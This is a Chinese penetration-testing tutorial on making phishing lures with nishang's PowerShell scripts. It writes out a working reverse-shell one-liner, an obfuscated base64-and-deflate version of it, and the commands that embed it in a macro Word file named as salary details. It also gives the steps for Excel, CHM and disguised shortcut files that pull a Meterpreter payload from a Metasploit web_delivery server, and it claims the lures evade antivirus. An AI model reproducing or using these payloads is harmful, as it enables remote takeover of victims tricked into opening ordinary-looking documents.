# 使用powershell Client进行有效钓鱼

0x00 简介
=====

**Powershell**是windows下面非常强大的命令行工具，并且在windows中Powershell可以利用.NET Framework的强大功能，也可以调用windows API，在win7/server 2008以后，powershell已被集成在系统当中。 除此之外，使用powershell能很好的bypass各种AV，在渗透测试中可谓是一个神器。此次使用的是开源的powershell脚本集[nishang](https://github.com/samratashok/nishang)中的client来制作钓鱼文件。其中office类型文件可以达到钓鱼目的的前提是`office已经启用宏`。

0x01制作word钓鱼文件
=====

下载[powercat](https://github.com/besimorhino/powercat)（**powershell的nc**）

加载powercat ：

```
PS G:\github\Pentest\powershell\powercat-master> . .\powercat.ps1
PS G:\github\Pentest\powershell\powercat-master> powercat
You must select either client mode (-c) or listen mode (-l).

```

加载以后使用powercat开启监听：

```
PS G:\github\Pentest\powershell\powercat-master> powercat -l -v -p 4444
详细信息: Set Stream 1: TCP
详细信息: Set Stream 2: Console
详细信息: Setting up Stream 1...
详细信息: Listening on [0.0.0.0] (port 4444)

```

测试加载Invoke-PowerShellTcp并执行：

```
PS G:\github\Pentest\powershell\nishang-master\Shells> . .\Invoke-PowerShellTcp.ps1
PS G:\github\Pentest\powershell\nishang-master\Shells> Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 4444

```

执行结果如下图：

![Alt text](http://drops.javaweb.org/uploads/images/ef9d9e553708d62875bcd3dd16f6bce216ad9d3c.jpg)

可以发现，直接获取了一个powershell的shell。下面制作word文件。 复制nishang中Invoke-PowerShellTcpOneLine.ps1 client代码，如下：

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.52.129",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text language=".encoding"][/text]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

使用Invoke-Encode.ps1进行编码,编码之前记得要修改ip以及自己要监听的端口

```
PS G:\github\Pentest\powershell\nishang-master\Shells> cd ..\Utility\
PS G:\github\Pentest\powershell\nishang-master\Utility> . .\Invoke-Encode.ps1
PS G:\github\Pentest\powershell\nishang-master\Utility> Invoke-Encode -DataToEncode '$client = New-Object System.Net.Sockets.TCPClient("192.1
68.52.129",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$da
ta = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendb
ack + "PS " + (pwd).Path + "> ";$sendbyte = ([text language=".encoding"][/text]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream
.Flush()};$client.Close()' -IsString -PostScriptCommand
Encoded data written to .\encoded.txt
Encoded command written to .\encodedcommand.txt

```

复制encodedcommand.txt的代码如下：

```
Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('TVHNasJAEL4X+g5DSMsuNUtMG6mGCm1oi1CiNEIP4mFNBpMao5gRFfXdu5uY1L3MMHx/M2tGWYo5wQsEuLOGs1+MCMJDQbgUAZIIV9ECqRBjf+SXSGa0u45od56Fq4rTNVpP6nHPLGiDcqmEzEpSfCKF5YxxbzI7EE6mU1PXQoFsITqu++ie7o722dslaYaMmammV0LiG2XMKnwL7BZUrfjCfE4J52DlCDY/emYsSSoeu1rAGh/WGMgl1quMcU/iNfQHg/c8WsVpPueXfKqtXbRJqjfBPJ7JaKFFU9xD5eD079twguGWrIoGV1AHyuQ18QGMUQiGqmy9i7kYSUr0sA/GhaMMtfyEdDC8ZJr2emXGMtubzsT+HZoTi59NSsgaHZW76evzNNiPbFskjJ+9+lf8bFUg47c3fw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();

```

加载Out-Word.ps1并生成后门，这里要注意，`要把payload里面的单引号多加一个单引号！`

```
PS G:\github\Pentest\powershell\nishang-master\Utility> . ..\Client\Out-Word.ps1
PS G:\github\Pentest\powershell\nishang-master\Utility> Out-Word -Payload 'powershell -c Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(''TVHNasJAEL4X+g5DSMsuNUtMG6mGCm1oi1CiNEIP4mFNBpMao5gRFfXdu5uY1L3MMHx/M2tGWYo5wQsEuLOGs1+MCMJDQbgUAZIIV9ECqRBjf+SXSGa0u45od56Fq4rTNVpP6nHPLGiDcqmEzEpSfCKF5YxxbzI7EE6mU1PXQoFsITqu++ie7o722dslaYaMmammV0LiG2XMKnwL7BZUrfjCfE4J52DlCDY/emYsSSoeu1rAGh/WGMgl1quMcU/iNfQHg/c8WsVpPueXfKqtXbRJqjfBPJ7JaKFFU9xD5eD079twguGWrIoGV1AHyuQ18QGMUQiGqmy9i7kYSUr0sA/GhaMMtfyEdDC8ZJr2emXGMtubzsT+HZoTi59NSsgaHZW76evzNNiPbFskjJ+9+lf8bFUg47c3fw=='')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();'
Saved to file G:\github\Pentest\powershell\nishang-master\Utility\Salary_Details.doc
0
PS G:\github\Pentest\powershell\nishang-master\Utility>

```

执行word以后，则会反弹shell，在启用宏的计算机上没有任何提示，未启用宏的计算机会有启用宏的提示。

![Alt text](http://drops.javaweb.org/uploads/images/af1618cfac92c2ae7552813d42289e1c8eea05b4.jpg)

获取反弹的powershell可以很容易的升级到metasploit的meterpreter。

0x02制作excel钓鱼文件
=====

首先使用msf的web_delivery开启一个powershell的监听：

```
#bash
msf > use exploit/multi/script/web_delivery 
msf exploit(web_delivery) > set target 2
target => 2
msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set LHOST 192.168.52.129
LHOST => 192.168.52.129
msf exploit(web_delivery) > set URIPATH /
URIPATH => 
msf exploit(web_delivery) > exploit 

```

开启服务如下图：

![Alt text](http://drops.javaweb.org/uploads/images/3528e441c940561956dc8956ab1893ac5388e64f.jpg)

使用Out-Excel.ps1制作excel钓鱼文件:

```
D:\temp>powershell
Windows PowerShell
版权所有 (C) 2015 Microsoft Corporation。保留所有权利。    

PS D:\temp> . .\Out-Excel.ps1
PS D:\temp> Out-Excel -PayloadURL http://192.168.52.129:8080/ -OutputFile  D:\temp\test.xls
Saved to file D:\temp\test.xls
0

```

其中`http://192.168.52.129:8080/`是msf开启的服务地址。 运行excel，获取meterpreter会话如下图：

![Alt text](http://drops.javaweb.org/uploads/images/c0d5a104260f2c153fc3f1d2d2c668828ac12423.jpg)

0x03制作chm钓鱼文件
=====

依然使用msf开启powershell的web_delivery，使用Out-CHM制作chm钓鱼文件：

```
PS D:\temp> Out-CHM -PayloadURL http://192.168.52.129:8080/ -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
Microsoft HTML Help Compiler 4.74.8702    

Compiling d:\temp\doc.chm    


Compile time: 0 minutes, 1 second
2       Topics
4       Local links
4       Internet links
0       Graphics    


Created d:\temp\doc.chm, 13,524 bytes
Compression increased file by 324 bytes.
PS D:\temp>

```

运行doc.chm,获取meterpreter会话:

![Alt text](http://drops.javaweb.org/uploads/images/f8fe9a12d832beb9582c59ecaad92cf60e66a4aa.jpg)

缺点是会弹出黑框框。丢给几个小伙伴测试，都上线了（23333）。

0x04制作快捷方式钓鱼文件
=====

依然使用之前开启的web_delivery,使用Out-Shortcut制作快捷方式钓鱼文件。

```
PS D:\temp> . .\Out-Shortcut.ps1
PS D:\temp> Out-Shortcut -PayloadURL http://192.168.52.129:8080/ -HotKey 'F3' -Icon 'notepad.exe'
The Shortcut file has been written as D:\temp\Shortcut to File Server.lnk

```

其中PayloadURL为web_delivery服务地址，Icon为快捷方式的图标，HotKey为快捷键。 右键属性快捷方式，可以看到快捷方式指向我们的服务地址，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/53282a9109791559272b386d896c0d6eb74082b0.jpg)

运行快捷方式，可以获取meterpreter会话：

![Alt text](http://drops.javaweb.org/uploads/images/cd83ffbb9cf0e196e93bd8606ab596c0331d8f4b.jpg)

0x05小结
=====

测试发现，上面几个方式还是挺有效的，使用chm方式更容易成功些，因为使用了powershell，防护软件并没有报警，其中还有WebQuery、java以及hta类型的钓鱼文件生成脚本，笔者测试java以及hta方式的没有成功，这里就不介绍了，至于WebQuery方式的在FB上已经有详细的介绍：[传送门](http://www.freebuf.com/news/76581.html)有兴趣的小伙伴可以继续研究研究。